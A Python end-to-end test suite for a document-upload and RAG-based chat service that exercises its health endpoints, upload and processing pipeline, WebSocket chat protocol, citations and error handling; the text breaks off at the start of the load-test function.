#!/usr/bin/env python3
"""
Comprehensive End-to-End Test Suite for Task 14.1

This test suite validates the complete user workflow from document upload
through RAG-enhanced chat responses, fixing WebSocket protocol issues
and ensuring production readiness.

Task 14.1: End-to-end testing
- Test complete user workflows from upload to chat
- Verify all error handling and recovery scenarios  
- Test system performance under load
- Validate security and privacy controls
"""

import asyncio
import aiohttp
import json
import websockets
import sys
import os
import time
import tempfile
import uuid
from pathlib import Path
from typing import Dict, List, Any, Optional
from datetime import datetime

# Add the src directory to the Python path
sys.path.insert(0, str(Path(__file__).parent / "src"))

class EndToEndTester:
    """Comprehensive end-to-end tester for production readiness validation."""
    
    def __init__(self, base_url: str = "http://localhost:8000"):
        self.base_url = base_url
        self.websocket_url = f"ws://localhost:8000/ws/chat"
        self.test_results = {}
        self.uploaded_documents = []
        self.test_user_id = f"test_user_{int(time.time())}"
        
    async def run_all_tests(self) -> Dict[str, Any]:
        """Run comprehensive end-to-end tests."""
        
        print("🧪 End-to-End Test Suite - Task 14.1")
        print("=" * 60)
        print("Testing complete production workflow with error handling")
        print("Validating system performance and security controls")
        print()
        
        # Test phases for production readiness
        test_phases = [
            ("System Health", self.test_system_health),
            ("Document Upload Workflow", self.test_document_upload_workflow),
            ("Document Processing Pipeline", self.test_document_processing_pipeline),
            ("WebSocket Chat Protocol", self.test_websocket_chat_protocol),
            ("RAG Integration Workflow", self.test_rag_integration_workflow),
            ("Complete User Journey", self.test_complete_user_journey),
            ("Error Handling & Recovery", self.test_error_handling_recovery),
            ("Performance Under Load", self.test_performance_under_load),
            ("Security & Privacy Controls", self.test_security_privacy_controls)
        ]
        
        overall_success = True
        
        for phase_name, test_function in test_phases:
            print(f"\n📋 Phase: {phase_name}")
            print("-" * 50)
            
            try:
                phase_result = await test_function()
                self.test_results[phase_name] = phase_result
                
                success_rate = self._calculate_phase_success_rate(phase_result)
                
                if success_rate >= 0.8:  # 80% success threshold
                    print(f"✅ {phase_name}: PASSED ({success_rate:.1%})")
                else:
                    print(f"❌ {phase_name}: FAILED ({success_rate:.1%})")
                    overall_success = False
                    
            except Exception as e:
                print(f"❌ {phase_name}: ERROR - {e}")
                self.test_results[phase_name] = {
                    'success': False,
                    'error': str(e),
                    'tests': {}
                }
                overall_success = False
        
        # Generate final assessment
        self.test_results['overall_success'] = overall_success
        self.test_results['test_timestamp'] = time.time()
        self.test_results['production_ready'] = self._assess_production_readiness()
        
        return self.test_results
    
    def _calculate_phase_success_rate(self, phase_result: Dict[str, Any]) -> float:
        """Calculate success rate for a test phase."""
        tests = phase_result.get('tests', {})
        if not tests:
            return 0.0
        
        passed_tests = sum(1 for result in tests.values() if result is True)
        return passed_tests / len(tests)
    
    def _assess_production_readiness(self) -> Dict[str, Any]:
        """Assess overall production readiness based on test results."""
        critical_phases = [
            "System Health",
            "Document Upload Workflow", 
            "WebSocket Chat Protocol",
            "RAG Integration Workflow",
            "Complete User Journey"
        ]
        
        critical_success = True
        for phase in critical_phases:
            if phase in self.test_results:
                success_rate = self._calculate_phase_success_rate(self.test_results[phase])
                if success_rate < 0.8:
                    critical_success = False
                    break
        
        return {
            'ready_for_production': critical_success and self.test_results.get('overall_success', False),
            'critical_phases_passed': critical_success,
            'recommended_actions': self._get_recommended_actions()
        }
    
    def _get_recommended_actions(self) -> List[str]:
        """Get recommended actions based on test results."""
        actions = []
        
        for phase_name, phase_result in self.test_results.items():
            if isinstance(phase_result, dict) and not phase_result.get('success', True):
                success_rate = self._calculate_phase_success_rate(phase_result)
                if success_rate < 0.8:
                    actions.append(f"Fix issues in {phase_name} (success rate: {success_rate:.1%})")
        
        if not actions:
            actions.append("System is ready for production deployment")
        
        return actions
    
    async def test_system_health(self) -> Dict[str, Any]:
        """Test system health and service availability."""
        
        results = {
            'success': True,
            'tests': {},
            'services': {}
        }
        
        async with aiohttp.ClientSession() as session:
            
            # Test 1: Main health endpoint
            try:
                async with session.get(f"{self.base_url}/health") as response:
                    if response.status == 200:
                        health_data = await response.json()
                        results['tests']['main_health_endpoint'] = True
                        results['services']['main'] = health_data
                        print(f"✅ Main health: {health_data.get('status', 'unknown')}")
                    else:
                        results['tests']['main_health_endpoint'] = False
                        results['success'] = False
                        print(f"❌ Main health failed: {response.status}")
            except Exception as e:
                results['tests']['main_health_endpoint'] = False
                results['success'] = False
                print(f"❌ Main health error: {e}")
            
            # Test 2: Chat service health
            try:
                async with session.get(f"{self.base_url}/chat/health") as response:
                    if response.status == 200:
                        chat_health = await response.json()
                        results['tests']['chat_service_health'] = True
                        results['services']['chat'] = chat_health
                        
                        features = chat_health.get('features', {})
                        print(f"✅ Chat service: {chat_health.get('status')}")
                        print(f"   - RAG integration: {features.get('rag_integration', False)}")
                        print(f"   - Active connections: {chat_health.get('active_connections', 0)}")
                    else:
                        results['tests']['chat_service_health'] = False
                        results['success'] = False
                        print(f"❌ Chat service health failed: {response.status}")
            except Exception as e:
                results['tests']['chat_service_health'] = False
                results['success'] = False
                print(f"❌ Chat service health error: {e}")
            
            # Test 3: Document service health
            try:
                async with session.get(f"{self.base_url}/api/documents/health") as response:
                    if response.status == 200:
                        doc_health = await response.json()
                        results['tests']['document_service_health'] = True
                        results['services']['documents'] = doc_health
                        print(f"✅ Document service: {doc_health.get('status')}")
                    else:
                        results['tests']['document_service_health'] = False
                        print(f"⚠️  Document service: {response.status}")
            except Exception as e:
                results['tests']['document_service_health'] = False
                print(f"⚠️  Document service error: {e}")
            
            # Test 4: Features endpoint
            try:
                async with session.get(f"{self.base_url}/features") as response:
                    if response.status == 200:
                        features_data = await response.json()
                        results['tests']['features_endpoint'] = True
                        results['services']['features'] = features_data
                        
                        features = features_data.get('features', {})
                        print(f"✅ Features available:")
                        print(f"   - Chat: {features.get('chat', False)}")
                        print(f"   - Document upload: {features.get('document_upload', False)}")
                        print(f"   - RAG integration: {features.get('rag_integration', False)}")
                    else:
                        results['tests']['features_endpoint'] = False
                        results['success'] = False
                        print(f"❌ Features endpoint failed: {response.status}")
            except Exception as e:
                results['tests']['features_endpoint'] = False
                results['success'] = False
                print(f"❌ Features endpoint error: {e}")
        
        return results
    
    async def test_document_upload_workflow(self) -> Dict[str, Any]:
        """Test complete document upload workflow."""
        
        results = {
            'success': True,
            'tests': {},
            'uploaded_documents': []
        }
        
        # Create comprehensive test document
        test_content = self._create_test_document_content()
        
        async with aiohttp.ClientSession() as session:
            
            # Test 1: Document upload with proper validation
            try:
                form_data = aiohttp.FormData()
                form_data.add_field('file', test_content.encode('utf-8'), 
                                  filename='comprehensive_test_document.txt',
                                  content_type='text/plain')
                form_data.add_field('title', 'Comprehensive Test Document')
                form_data.add_field('description', 'Test document for end-to-end validation')
                form_data.add_field('user_id', self.test_user_id)
                
                async with session.post(f"{self.base_url}/api/documents/upload", 
                                      data=form_data) as response:
                    if response.status == 200:
                        upload_result = await response.json()
                        results['tests']['document_upload'] = True
                        results['uploaded_documents'].append(upload_result)
                        self.uploaded_documents.append(upload_result)
                        
                        print(f"✅ Document upload successful")
                        print(f"   - Document ID: {upload_result.get('document_id')}")
                        print(f"   - Status: {upload_result.get('status')}")
                        print(f"   - Size: {len(test_content)} characters")
                    else:
                        results['tests']['document_upload'] = False
                        results['success'] = False
                        error_text = await response.text()
                        print(f"❌ Document upload failed: {response.status}")
                        print(f"   Error: {error_text}")
            except Exception as e:
                results['tests']['document_upload'] = False
                results['success'] = False
                print(f"❌ Document upload error: {e}")
            
            # Test 2: Document listing and retrieval
            try:
                async with session.get(f"{self.base_url}/api/documents/") as response:
                    if response.status == 200:
                        doc_list = await response.json()
                        results['tests']['document_listing'] = True
                        
                        print(f"✅ Document listing successful")
                        print(f"   - Total documents: {doc_list.get('total_count', 0)}")
                    else:
                        results['tests']['document_listing'] = False
                        results['success'] = False
                        print(f"❌ Document listing failed: {response.status}")
            except Exception as e:
                results['tests']['document_listing'] = False
                results['success'] = False
                print(f"❌ Document listing error: {e}")
            
            # Test 3: Document metadata validation
            if self.uploaded_documents:
                try:
                    doc_id = self.uploaded_documents[0].get('document_id')
                    async with session.get(f"{self.base_url}/api/documents/{doc_id}") as response:
                        if response.status == 200:
                            doc_details = await response.json()
                            results['tests']['document_metadata'] = True
                            
                            # Validate required metadata fields
                            required_fields = ['id', 'title', 'filename', 'status', 'upload_timestamp']
                            missing_fields = [field for field in required_fields if field not in doc_details]
                            
                            if not missing_fields:
                                print(f"✅ Document metadata complete")
                            else:
                                print(f"⚠️  Missing metadata fields: {missing_fields}")
                        else:
                            results['tests']['document_metadata'] = False
                            results['success'] = False
                            print(f"❌ Document metadata retrieval failed: {response.status}")
                except Exception as e:
                    results['tests']['document_metadata'] = False
                    results['success'] = False
                    print(f"❌ Document metadata error: {e}")
        
        return results
    
    def _create_test_document_content(self) -> str:
        """Create comprehensive test document content for RAG testing."""
        return """# Comprehensive Test Document for RAG Integration

## Introduction
This document contains diverse content to test the RAG (Retrieval-Augmented Generation) system's ability to understand, process, and retrieve information from uploaded documents.

## Machine Learning Concepts

### Supervised Learning
Supervised learning is a type of machine learning where algorithms learn from labeled training data. The goal is to make predictions on new, unseen data based on patterns learned from the training set.

Key algorithms include:
- Linear Regression: For predicting continuous values
- Decision Trees: For both classification and regression tasks
- Random Forest: An ensemble method using multiple decision trees
- Support Vector Machines: For classification and regression with optimal boundaries

### Neural Networks
Neural networks are computing systems inspired by biological neural networks. They consist of interconnected nodes (neurons) that process information through weighted connections.

Deep learning uses neural networks with multiple hidden layers to learn complex patterns in data. Applications include:
- Image recognition and computer vision
- Natural language processing
- Speech recognition
- Autonomous vehicles

### Natural Language Processing
Natural language processing (NLP) enables computers to understand, interpret, and generate human language. Key techniques include:
- Tokenization: Breaking text into individual words or tokens
- Named Entity Recognition: Identifying people, places, organizations
- Sentiment Analysis: Determining emotional tone of text
- Machine Translation: Converting text between languages

## Data Science Methodology

### Data Collection
The first step in any data science project is collecting relevant, high-quality data. Sources may include:
- Databases and data warehouses
- APIs and web scraping
- Surveys and experiments
- Public datasets and repositories

### Data Preprocessing
Raw data often requires cleaning and preparation:
- Handling missing values
- Removing duplicates
- Normalizing and scaling features
- Encoding categorical variables

### Model Evaluation
Proper evaluation ensures model reliability:
- Cross-validation techniques
- Performance metrics (accuracy, precision, recall, F1-score)
- Confusion matrices for classification
- ROC curves and AUC scores

## Technical Implementation

### Python Libraries
Essential libraries for machine learning and data science:
- NumPy: Numerical computing with arrays
- Pandas: Data manipulation and analysis
- Scikit-learn: Machine learning algorithms
- TensorFlow/PyTorch: Deep learning frameworks
- Matplotlib/Seaborn: Data visualization

### Best Practices
- Version control with Git
- Reproducible environments with virtual environments
- Documentation and code comments
- Unit testing for data pipelines
- Continuous integration and deployment

## Conclusion
This document provides a comprehensive overview of machine learning and data science concepts, serving as test content for validating document processing, chunking, embedding generation, and retrieval capabilities in the RAG system.

The system should be able to answer questions about any of the topics covered, including specific algorithms, methodologies, and implementation details mentioned throughout this document.
"""
    
    async def test_document_processing_pipeline(self) -> Dict[str, Any]:
        """Test document processing pipeline with status tracking."""
        
        results = {
            'success': True,
            'tests': {},
            'processing_status': {}
        }
        
        if not self.uploaded_documents:
            print("⚠️  Skipping processing tests - no documents uploaded")
            results['tests']['skipped'] = True
            return results
        
        async with aiohttp.ClientSession() as session:
            
            # Test 1: Processing status tracking
            try:
                doc_id = self.uploaded_documents[0].get('document_id')
                
                # Check initial status
                async with session.get(f"{self.base_url}/api/documents/{doc_id}/status") as response:
                    if response.status == 200:
                        status_data = await response.json()
                        results['tests']['status_tracking'] = True
                        results['processing_status']['initial'] = status_data
                        
                        print(f"✅ Processing status tracking available")
                        print(f"   - Status: {status_data.get('status')}")
                        print(f"   - Progress: {status_data.get('progress_percentage', 0)}%")
                    else:
                        results['tests']['status_tracking'] = False
                        print(f"⚠️  Status tracking unavailable: {response.status}")
            except Exception as e:
                results['tests']['status_tracking'] = False
                print(f"⚠️  Status tracking error: {e}")
            
            # Test 2: Wait for processing completion (with timeout)
            try:
                doc_id = self.uploaded_documents[0].get('document_id')
                processing_complete = False
                timeout_seconds = 120  # 2 minutes timeout
                start_time = time.time()
                
                while not processing_complete and (time.time() - start_time) < timeout_seconds:
                    async with session.get(f"{self.base_url}/api/documents/{doc_id}") as response:
                        if response.status == 200:
                            doc_data = await response.json()
                            status = doc_data.get('status')
                            
                            if status == 'completed':
                                processing_complete = True
                                results['tests']['processing_completion'] = True
                                results['processing_status']['final'] = doc_data
                                
                                print(f"✅ Document processing completed")
                                print(f"   - Processing time: {time.time() - start_time:.1f}s")
                                print(f"   - Chunks created: {doc_data.get('chunk_count', 0)}")
                            elif status == 'failed':
                                results['tests']['processing_completion'] = False
                                results['success'] = False
                                print(f"❌ Document processing failed")
                                break
                            else:
                                # Still processing, wait a bit
                                await asyncio.sleep(2)
                        else:
                            print(f"⚠️  Status check failed: {response.status}")
                            await asyncio.sleep(2)
                
                if not processing_complete:
                    results['tests']['processing_completion'] = False
                    print(f"⚠️  Processing timeout after {timeout_seconds}s")
                    
            except Exception as e:
                results['tests']['processing_completion'] = False
                results['success'] = False
                print(f"❌ Processing completion test error: {e}")
            
            # Test 3: Verify chunks were created
            try:
                doc_id = self.uploaded_documents[0].get('document_id')
                async with session.get(f"{self.base_url}/api/documents/{doc_id}/chunks") as response:
                    if response.status == 200:
                        chunks_data = await response.json()
                        chunk_count = len(chunks_data.get('chunks', []))
                        
                        if chunk_count > 0:
                            results['tests']['chunk_creation'] = True
                            print(f"✅ Document chunks created: {chunk_count}")
                        else:
                            results['tests']['chunk_creation'] = False
                            results['success'] = False
                            print(f"❌ No chunks created")
                    else:
                        results['tests']['chunk_creation'] = False
                        print(f"⚠️  Chunks endpoint unavailable: {response.status}")
            except Exception as e:
                results['tests']['chunk_creation'] = False
                print(f"⚠️  Chunk creation test error: {e}")
        
        return results
    
    async def test_websocket_chat_protocol(self) -> Dict[str, Any]:
        """Test WebSocket chat protocol with proper message handling."""
        
        results = {
            'success': True,
            'tests': {},
            'protocol_validation': {}
        }
        
        try:
            print("📡 Testing WebSocket chat protocol...")
            
            # Test 1: Connection establishment
            async with websockets.connect(self.websocket_url) as websocket:
                results['tests']['websocket_connection'] = True
                print("✅ WebSocket connection established")
                
                # Test 2: Start conversation protocol
                start_message = {"type": "start_conversation"}
                await websocket.send(json.dumps(start_message))
                
                try:
                    response = await asyncio.wait_for(websocket.recv(), timeout=10.0)
                    start_response = json.loads(response)
                    
                    # Validate response structure
                    expected_fields = ['type', 'thread_id', 'features']
                    protocol_valid = all(field in start_response for field in expected_fields)
                    
                    if start_response.get('type') == 'conversation_started' and protocol_valid:
                        results['tests']['conversation_start_protocol'] = True
                        thread_id = start_response.get('thread_id')
                        features = start_response.get('features', {})
                        
                        results['protocol_validation']['start_response'] = start_response
                        
                        print("✅ Conversation start protocol valid")
                        print(f"   - Thread ID: {thread_id}")
                        print(f"   - RAG enabled: {features.get('rag_enabled', False)}")
                        print(f"   - Features: {list(features.keys())}")
                    else:
                        results['tests']['conversation_start_protocol'] = False
                        results['success'] = False
                        print(f"❌ Invalid start protocol: {start_response}")
                        
                except asyncio.TimeoutError:
                    results['tests']['conversation_start_protocol'] = False
                    results['success'] = False
                    print("❌ Conversation start timeout")
                
                # Test 3: Chat message protocol
                test_message = "Hello! This is a test message to validate the chat protocol."
                chat_message = {
                    "type": "chat_message",
                    "message": test_message
                }
                await websocket.send(json.dumps(chat_message))
                
                # Collect all responses for this message
                responses_received = []
                processing_seen = False
                final_response_received = False
                
                timeout_time = time.time() + 30.0  # 30 second timeout
                
                while time.time() < timeout_time and not final_response_received:
                    try:
                        response = await asyncio.wait_for(websocket.recv(), timeout=5.0)
                        response_data = json.loads(response)
                        responses_received.append(response_data)
                        
                        response_type = response_data.get('type')
                        
                        if response_type == 'processing':
                            processing_seen = True
                            print("⏳ Processing indicator received")
                        
                        elif response_type == 'response':
                            # Validate response structure
                            response_content = response_data.get('response', {})
                            metadata = response_data.get('metadata', {})
                            
                            required_response_fields = ['text_content']
                            response_valid = all(field in response_content for field in required_response_fields)
                            
                            if response_valid:
                                results['tests']['chat_response_protocol'] = True
                                results['protocol_validation']['chat_response'] = response_data
                                
                                text_content = response_content.get('text_content', '')
                                citations = response_content.get('knowledge_citations', [])
                                
                                print("✅ Chat response protocol valid")
                                print(f"   - Response length: {len(text_content)} characters")
                                print(f"   - Citations: {len(citations)}")
                                print(f"   - RAG enabled: {metadata.get('rag_enabled', False)}")
                                print(f"   - Processing time: {metadata.get('processing_time_ms', 'N/A')}ms")
                                
                                final_response_received = True
                            else:
                                results['tests']['chat_response_protocol'] = False
                                results['success'] = False
                                print(f"❌ Invalid response protocol: missing fields")
                                final_response_received = True
                        
                        elif response_type == 'error':
                            results['tests']['chat_response_protocol'] = False
                            results['success'] = False
                            print(f"❌ Chat error: {response_data.get('message')}")
                            final_response_received = True
                        
                        elif response_type == 'processing_complete':
                            print("✅ Processing complete indicator received")
                            # Don't set final_response_received here, wait for actual response
                    
                    except asyncio.TimeoutError:
                        # Continue waiting if we haven't hit the overall timeout
                        continue
                    except json.JSONDecodeError as e:
                        results['tests']['chat_response_protocol'] = False
                        results['success'] = False
                        print(f"❌ Invalid JSON in response: {e}")
                        final_response_received = True
                
                if not final_response_received:
                    results['tests']['chat_response_protocol'] = False
                    results['success'] = False
                    print("❌ Chat response timeout")
                
                # Test 4: Protocol indicators
                results['tests']['processing_indicators'] = processing_seen
                results['protocol_validation']['all_responses'] = responses_received
                
                if processing_seen:
                    print("✅ Processing indicators working")
                else:
                    print("⚠️  No processing indicators seen")
        
        except websockets.exceptions.ConnectionClosed:
            results['tests']['websocket_connection'] = False
            results['success'] = False
            print("❌ WebSocket connection closed unexpectedly")
        except Exception as e:
            results['tests']['websocket_connection'] = False
            results['success'] = False
            print(f"❌ WebSocket protocol test error: {e}")
        
        return results
    
    async def test_rag_integration_workflow(self) -> Dict[str, Any]:
        """Test RAG integration with document knowledge."""
        
        results = {
            'success': True,
            'tests': {},
            'rag_analysis': {}
        }
        
        if not self.uploaded_documents:
            print("⚠️  Skipping RAG tests - no documents uploaded")
            results['tests']['skipped'] = True
            return results
        
        try:
            async with websockets.connect(self.websocket_url) as websocket:
                
                # Start conversation
                start_message = {"type": "start_conversation"}
                await websocket.send(json.dumps(start_message))
                await websocket.recv()  # Consume start response
                
                # Test 1: Document-specific query
                rag_queries = [
                    "What machine learning algorithms are mentioned in my documents?",
                    "Explain the supervised learning concepts from the uploaded content.",
                    "What are the key steps in data preprocessing according to my documents?",
                    "Tell me about neural networks based on the information you have."
                ]
                
                successful_rag_responses = 0
                
                for i, query in enumerate(rag_queries, 1):
                    print(f"🔍 Testing RAG query {i}: {query[:50]}...")
                    
                    chat_message = {
                        "type": "chat_message", 
                        "message": query
                    }
                    await websocket.send(json.dumps(chat_message))
                    
                    # Wait for RAG response
                    response_received = False
                    rag_response_data = None
                    timeout_time = time.time() + 30.0
                    
                    while not response_received and time.time() < timeout_time:
                        try:
                            response = await asyncio.wait_for(websocket.recv(), timeout=5.0)
                            response_data = json.loads(response)
                            
                            if response_data.get('type') == 'response':
                                rag_response_data = response_data
                                response_received = True
                            elif response_data.get('type') == 'error':
                                print(f"❌ RAG query {i} error: {response_data.get('message')}")
                                response_received = True
                        
                        except asyncio.TimeoutError:
                            continue
                    
                    if rag_response_data:
                        response_content = rag_response_data.get('response', {})
                        citations = response_content.get('knowledge_citations', [])
                        metadata = rag_response_data.get('metadata', {})
                        
                        # Analyze RAG quality
                        rag_enabled = metadata.get('rag_enabled', False)
                        search_results_count = metadata.get('search_results_count', 0)
                        confidence_score = metadata.get('confidence_score', 0)
                        fallback_used = metadata.get('fallback_used', True)
                        
                        if rag_enabled and search_results_count > 0 and not fallback_used:
                            successful_rag_responses += 1
                            print(f"✅ RAG query {i} successful")
                            print(f"   - Citations: {len(citations)}")
                            print(f"   - Confidence: {confidence_score:.3f}")
                            print(f"   - Search results: {search_results_count}")
                        else:
                            print(f"⚠️  RAG query {i} used fallback")
                            print(f"   - RAG enabled: {rag_enabled}")
                            print(f"   - Search results: {search_results_count}")
                            print(f"   - Fallback used: {fallback_used}")
                    else:
                        print(f"❌ RAG query {i} failed - no response")
                
                # Evaluate RAG performance
                rag_success_rate = successful_rag_responses / len(rag_queries)
                results['tests']['rag_document_queries'] = rag_success_rate >= 0.5  # 50% success threshold
                results['rag_analysis']['success_rate'] = rag_success_rate
                results['rag_analysis']['successful_queries'] = successful_rag_responses
                results['rag_analysis']['total_queries'] = len(rag_queries)
                
                print(f"📊 RAG Integration Analysis:")
                print(f"   - Success rate: {rag_success_rate:.1%}")
                print(f"   - Successful queries: {successful_rag_responses}/{len(rag_queries)}")
                
                if rag_success_rate >= 0.5:
                    print("✅ RAG integration working adequately")
                else:
                    print("⚠️  RAG integration needs improvement")
                    results['success'] = False
                
                # Test 2: Citation quality
                if successful_rag_responses > 0:
                    results['tests']['citation_quality'] = True
                    print("✅ Citations provided in RAG responses")
                else:
                    results['tests']['citation_quality'] = False
                    print("⚠️  No citations found in RAG responses")
        
        except Exception as e:
            results['tests']['rag_integration'] = False
            results['success'] = False
            print(f"❌ RAG integration test error: {e}")
        
        return results
    
    async def test_complete_user_journey(self) -> Dict[str, Any]:
        """Test complete user journey from upload to chat."""
        
        results = {
            'success': True,
            'tests': {},
            'journey_metrics': {}
        }
        
        print("🚀 Testing complete user journey...")
        
        journey_start_time = time.time()
        
        try:
            # Step 1: Upload a new document for this journey
            test_content = """# User Journey Test Document

This document is specifically created to test the complete user journey
from document upload through processing to RAG-enhanced chat responses.

## Key Information for Testing
- Document type: User journey validation
- Content: Structured test information
- Purpose: End-to-end workflow validation

## Test Topics
1. Journey validation process
2. Upload workflow testing  
3. Processing pipeline verification
4. Chat integration confirmation

This content should be retrievable through RAG queries during the journey test.
"""
            
            async with aiohttp.ClientSession() as session:
                form_data = aiohttp.FormData()
                form_data.add_field('file', test_content.encode('utf-8'), 
                                  filename='user_journey_test.txt',
                                  content_type='text/plain')
                form_data.add_field('title', 'User Journey Test Document')
                form_data.add_field('user_id', self.test_user_id)
                
                async with session.post(f"{self.base_url}/api/documents/upload", 
                                      data=form_data) as response:
                    if response.status == 200:
                        upload_result = await response.json()
                        results['tests']['journey_upload'] = True
                        journey_doc_id = upload_result.get('document_id')
                        print(f"✅ Journey document uploaded: {journey_doc_id}")
                    else:
                        results['tests']['journey_upload'] = False
                        results['success'] = False
                        print(f"❌ Journey upload failed: {response.status}")
                        return results
            
            # Step 2: Wait for processing (shorter timeout for journey test)
            processing_complete = False
            processing_start = time.time()
            timeout_seconds = 60  # 1 minute timeout for journey
            
            async with aiohttp.ClientSession() as session:
                while not processing_complete and (time.time() - processing_start) < timeout_seconds:
                    async with session.get(f"{self.base_url}/api/documents/{journey_doc_id}") as response:
                        if response.status == 200:
                            doc_data = await response.json()
                            if doc_data.get('status') == 'completed':
                                processing_complete = True
                                results['tests']['journey_processing'] = True
                                processing_time = time.time() - processing_start
                                results['journey_metrics']['processing_time'] = processing_time
                                print(f"✅ Journey document processed in {processing_time:.1f}s")
                                break
                            elif doc_data.get('status') == 'failed':
                                results['tests']['journey_processing'] = False
                                results['success'] = False
                                print(f"❌ Journey document processing failed")
                                return results
                        await asyncio.sleep(2)
                
                if not processing_complete:
                    results['tests']['journey_processing'] = False
                    results['success'] = False
                    print(f"❌ Journey processing timeout")
                    return results
            
            # Step 3: Test chat with the new document
            async with websockets.connect(self.websocket_url) as websocket:
                # Start conversation
                start_message = {"type": "start_conversation"}
                await websocket.send(json.dumps(start_message))
                await websocket.recv()  # Consume start response
                
                # Ask about the journey document
                journey_query = "What information do you have about the user journey test document I just uploaded?"
                chat_message = {
                    "type": "chat_message",
                    "message": journey_query
                }
                await websocket.send(json.dumps(chat_message))
                
                # Wait for response
                response_received = False
                chat_start = time.time()
                
                while not response_received and (time.time() - chat_start) < 20.0:
                    try:
                        response = await asyncio.wait_for(websocket.recv(), timeout=5.0)
                        response_data = json.loads(response)
                        
                        if response_data.get('type') == 'response':
                            response_content = response_data.get('response', {})
                            citations = response_content.get('knowledge_citations', [])
                            metadata = response_data.get('metadata', {})
                            
                            # Check if the response references the journey document
                            text_content = response_content.get('text_content', '').lower()
                            journey_referenced = any([
                                'journey' in text_content,
                                'user journey' in text_content,
                                len(citations) > 0
                            ])
                            
                            if journey_referenced:
                                results['tests']['journey_chat_integration'] = True
                                chat_response_time = time.time() - chat_start
                                results['journey_metrics']['chat_response_time'] = chat_response_time
                                
                                print(f"✅ Journey chat integration successful")
                                print(f"   - Response time: {chat_response_time:.1f}s")
                                print(f"   - Citations: {len(citations)}")
                                print(f"   - RAG enabled: {metadata.get('rag_enabled', False)}")
                            else:
                                results['tests']['journey_chat_integration'] = False
                                results['success'] = False
                                print(f"⚠️  Journey document not referenced in chat")
                            
                            response_received = True
                        
                        elif response_data.get('type') == 'error':
                            results['tests']['journey_chat_integration'] = False
                            results['success'] = False
                            print(f"❌ Journey chat error: {response_data.get('message')}")
                            response_received = True
                    
                    except asyncio.TimeoutError:
                        continue
                
                if not response_received:
                    results['tests']['journey_chat_integration'] = False
                    results['success'] = False
                    print(f"❌ Journey chat timeout")
            
            # Calculate total journey time
            total_journey_time = time.time() - journey_start_time
            results['journey_metrics']['total_time'] = total_journey_time
            
            print(f"📊 Complete User Journey Metrics:")
            print(f"   - Total time: {total_journey_time:.1f}s")
            print(f"   - Processing time: {results['journey_metrics'].get('processing_time', 0):.1f}s")
            print(f"   - Chat response time: {results['journey_metrics'].get('chat_response_time', 0):.1f}s")
            
            # Journey success criteria
            if (results['tests'].get('journey_upload', False) and 
                results['tests'].get('journey_processing', False) and 
                results['tests'].get('journey_chat_integration', False) and
                total_journey_time < 120):  # Complete journey under 2 minutes
                
                print("🎉 Complete user journey successful!")
            else:
                results['success'] = False
                print("⚠️  User journey has issues")
        
        except Exception as e:
            results['tests']['journey_error'] = str(e)
            results['success'] = False
            print(f"❌ User journey test error: {e}")
        
        return results
    
    async def test_error_handling_recovery(self) -> Dict[str, Any]:
        """Test error handling and recovery scenarios."""
        
        results = {
            'success': True,
            'tests': {},
            'error_scenarios': {}
        }
        
        async with aiohttp.ClientSession() as session:
            
            # Test 1: Invalid file upload
            try:
                # Try to upload invalid file type
                form_data = aiohttp.FormData()
                form_data.add_field('file', b'invalid binary content', 
                                  filename='malicious.exe',
                                  content_type='application/octet-stream')
                form_data.add_field('title', 'Invalid File Test')
                
                async with session.post(f"{self.base_url}/api/documents/upload", 
                                      data=form_data) as response:
                    if response.status in [400, 415, 422]:  # Should reject invalid file
                        results['tests']['invalid_file_rejection'] = True
                        print("✅ Invalid file properly rejected")
                    else:
                        results['tests']['invalid_file_rejection'] = False
                        results['success'] = False
                        print(f"⚠️  Invalid file not rejected: {response.status}")
            except Exception as e:
                results['tests']['invalid_file_rejection'] = False
                print(f"❌ Invalid file test error: {e}")
            
            # Test 2: Oversized file upload
            try:
                # Create oversized content (>100MB)
                large_content = b'x' * (101 * 1024 * 1024)  # 101MB
                
                form_data = aiohttp.FormData()
                form_data.add_field('file', large_content, 
                                  filename='oversized.txt',
                                  content_type='text/plain')
                form_data.add_field('title', 'Oversized File Test')
                
                async with session.post(f"{self.base_url}/api/documents/upload", 
                                      data=form_data) as response:
                    if response.status in [413, 422]:  # Should reject oversized file
                        results['tests']['oversized_file_rejection'] = True
                        print("✅ Oversized file properly rejected")
                    else:
                        results['tests']['oversized_file_rejection'] = False
                        results['success'] = False
                        print(f"⚠️  Oversized file not rejected: {response.status}")
            except Exception as e:
                results['tests']['oversized_file_rejection'] = False
                print(f"❌ Oversized file test error: {e}")
            
            # Test 3: Non-existent document retrieval
            try:
                fake_doc_id = str(uuid.uuid4())
                async with session.get(f"{self.base_url}/api/documents/{fake_doc_id}") as response:
                    if response.status == 404:  # Should return not found
                        results['tests']['nonexistent_document_handling'] = True
                        print("✅ Non-existent document properly handled")
                    else:
                        results['tests']['nonexistent_document_handling'] = False
                        results['success'] = False
                        print(f"⚠️  Non-existent document handling: {response.status}")
            except Exception as e:
                results['tests']['nonexistent_document_handling'] = False
                print(f"❌ Non-existent document test error: {e}")
            
            # Test 4: WebSocket error handling
            try:
                async with websockets.connect(self.websocket_url) as websocket:
                    # Send malformed JSON
                    await websocket.send("invalid json message")
                    
                    try:
                        response = await asyncio.wait_for(websocket.recv(), timeout=5.0)
                        response_data = json.loads(response)
                        
                        if response_data.get('type') == 'error':
                            results['tests']['websocket_error_handling'] = True
                            print("✅ WebSocket error handling working")
                        else:
                            results['tests']['websocket_error_handling'] = False
                            print("⚠️  WebSocket error handling unclear")
                    except (asyncio.TimeoutError, json.JSONDecodeError):
                        results['tests']['websocket_error_handling'] = False
                        print("⚠️  WebSocket error handling timeout")
                        
            except Exception as e:
                results['tests']['websocket_error_handling'] = False
                print(f"❌ WebSocket error handling test error: {e}")
            
            # Test 5: Service degradation handling
            try:
                # Test behavior when services are under stress
                # This simulates multiple rapid requests
                rapid_requests = []
                for i in range(10):
                    rapid_requests.append(
                        session.get(f"{self.base_url}/health")
                    )
                
                responses = await asyncio.gather(*rapid_requests, return_exceptions=True)
                successful_responses = sum(1 for r in responses if not isinstance(r, Exception) and r.status == 200)
                
                if successful_responses >= 8:  # 80% success under load
                    results['tests']['service_degradation_handling'] = True
                    print(f"✅ Service degradation handling: {successful_responses}/10 requests successful")
                else:
                    results['tests']['service_degradation_handling'] = False
                    results['success'] = False
                    print(f"⚠️  Service degradation issues: {successful_responses}/10 requests successful")
                    
            except Exception as e:
                results['tests']['service_degradation_handling'] = False
                print(f"❌ Service degradation test error: {e}")
        
        return results
    
    async def test_performance_under_load(self) -> Dict[str, Any]:
        """Test system performance under load."""
        
        results = {
            'success': True,
            'tests': {},
